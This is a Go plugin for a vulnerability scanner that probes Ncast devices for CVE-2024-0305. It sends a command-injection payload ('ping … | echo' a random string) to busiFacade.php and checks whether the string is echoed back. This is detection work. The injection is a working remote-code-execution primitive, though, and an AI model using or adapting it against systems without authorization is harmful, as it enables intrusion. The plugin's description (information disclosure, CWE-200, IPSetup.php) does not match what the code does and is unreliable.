package goplugin

import (
	"Yscanner/utils"
	"bytes"
	"net/http"
	"strings"
)

func init() {
	Register("ncast_rce_cve_2024_0305", &ncast_rce_cve_2024_0305{})
}

type ncast_rce_cve_2024_0305 struct{}

func (p *ncast_rce_cve_2024_0305) Info() PluginInfo {
	return PluginInfo{
		Name:     "Ncast busiFacade RCE漏洞",
		VulnInfo: "广州盈科电子技术 Ncast 组件 Guest Login 中的 /manage/IPSetup.php 文件存在漏洞，影响未知功能。攻击者可以利用该漏洞进行信息泄露，并可以远程发起攻击。",
		VulnID:   "CVE-2024-0305",
		Level:    "7.5 HIGH",
		URL:      "",
		Version:  "",
		CWE:      "CWE-200	信息暴露",
	}
}

func (p *ncast_rce_cve_2024_0305) Check(netloc string) bool {
	randstr := utils.GenRandom(10)
	payload := "%7B%22name%22:%22ping%22,%22serviceName%22:%22SysManager%22,%22userTransaction%22:false,%22param%22:%5B%22ping%20127.0.0.1%20%7C%20echo%20"
	payload += randstr
	payload += "%22%5D%7D"

	req, err := http.NewRequest("POST", netloc+"/classes/common/busiFacade.php", bytes.NewBufferString(payload))
	if err != nil {
		return false
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
	resp, err := utils.RequestDo(req, true, 2)
	if err != nil {
		return false
	}

	if resp.Other.StatusCode == 200 && strings.Contains(resp.ResponseRaw, randstr) {
		return true
	}
	return false
}
